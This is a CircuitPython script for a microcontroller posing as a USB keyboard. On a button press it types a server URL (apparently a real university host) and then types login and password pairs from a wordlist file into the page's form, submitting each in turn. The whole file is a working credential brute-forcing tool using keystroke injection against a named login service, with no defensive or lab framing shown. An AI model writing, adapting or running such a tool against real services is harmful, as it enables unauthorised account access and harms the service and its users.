### LIBRARIES ###
import usb_hid
import board
import time
import digitalio

from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

### VARIABLES ###
startButton = digitalio.DigitalInOut(board.GP1)
readyLED = digitalio.DigitalInOut(board.GP6)
runningLED = digitalio.DigitalInOut(board.GP15)
readyLED.direction = digitalio.Direction.OUTPUT
runningLED.direction = digitalio.Direction.OUTPUT
startButton.switch_to_input(pull = digitalio.Pull.UP)
filePath = "./wordlist.txt"
kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)
serverUrl = "http://bridge.ufsc.br"

### FUNCTIONS ###

def clearField():
  kbd.press(Keycode.BACKSPACE)
  time.sleep(3)
  kbd.release_all()


def typeCredentials(login, password):
  clearField()
  layout.write(login)
  kbd.send(Keycode.TAB)
  kbd.send(Keycode.TAB)
  clearField()
  layout.write(password)
  kbd.send(Keycode.ENTER)
  time.sleep(0.5)
  kbd.send(Keycode.TAB)
  kbd.send(Keycode.ENTER)
  time.sleep(0.5)
  kbd.send(Keycode.TAB)
  kbd.send(Keycode.TAB)
  kbd.send(Keycode.TAB)
  kbd.send(Keycode.TAB)
  kbd.send(Keycode.TAB)


### MAIN LOOOP ###
readyLED.value = True
runningLED.value = False
while True:
  if startButton.value == False: # If the startButton is pressed
	  try:
	    with open(filePath, "r") as file:
	      readyLED.value = False
	      runningLED.value = True
	      layout.write(serverUrl)
	      kbd.send(Keycode.TAB)
	      kbd.send(Keycode.TAB)
	      for line in file:
	        words = line.strip().split(',')
	        login = words[0]
	        password = words[1]
	        typeCredentials(login, password)
	        time.sleep(1)
	      
	      readyLED.value = True
	      runningLED.value = False  
	  except: print("[-] Error")